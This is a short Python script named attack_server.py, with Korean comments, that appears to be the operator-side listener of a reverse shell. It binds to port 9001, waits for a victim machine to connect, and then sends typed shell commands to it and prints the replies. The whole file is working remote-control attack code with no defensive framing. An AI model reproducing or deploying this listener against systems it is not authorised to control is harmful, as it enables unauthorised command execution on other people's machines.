#attack_server.py
import socket
import os,time
import ascii_quokka
ascii_quokka.print_ascii()
host = '0.0.0.0' # i don't know my ip, router!
port = 9001 #empty port of host

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.bind((host, port))
    print(f"서버 시작 {port}")
except socket.error as e:
    print(f"서버 시작 실패 {e}")
    os.system("pause")
s.listen(1)

print('Waiting for connection...')


conn, addr = s.accept()
print('\n')
print('Connected by', addr)
while True:
    cmd = input('$')
    if(len(cmd)>0):  #빈 버퍼를 보내면 상대가 받지못한다. 그러면 무한 교착상태 발생
        conn.send(cmd.encode())
        try:
            print("wait for client message...")
            client_response = conn.recv(10000)
            print(client_response.decode())
        except Exception as e:
            print(e)
